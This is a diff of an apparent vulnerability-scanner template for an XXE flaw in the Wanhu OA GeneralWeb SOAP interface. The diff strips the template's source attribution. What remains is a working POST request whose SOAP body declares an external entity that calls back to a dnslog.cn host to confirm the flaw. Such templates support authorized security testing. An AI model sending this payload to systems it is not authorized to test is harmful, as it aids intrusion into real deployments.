@@ -3,11 +3,8 @@ info:
   name: 万户OA系统接口GeneralWeb存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oo3h0428894us8c1'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oo3h0428894us8c1
 http:
 - raw:
   - "POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\nContent-Type: text/xml;charset=UTF-8\nSOAPAction:\nContent-Length: 457\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gen=\"http://com.whir.service/GeneralWeb\">\n  <soapenv:Body>\n    <gen:OAManager>\n      <gen:input>\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <!DOCTYPE root [\n        <!ENTITY x SYSTEM \"http://123.6x9ryk.dnslog.cn\">]>\n        <root>&x;</root>\n      </gen:input>\n    </gen:OAManager>\n  </soapenv:Body>\n</soapenv:Envelope>"
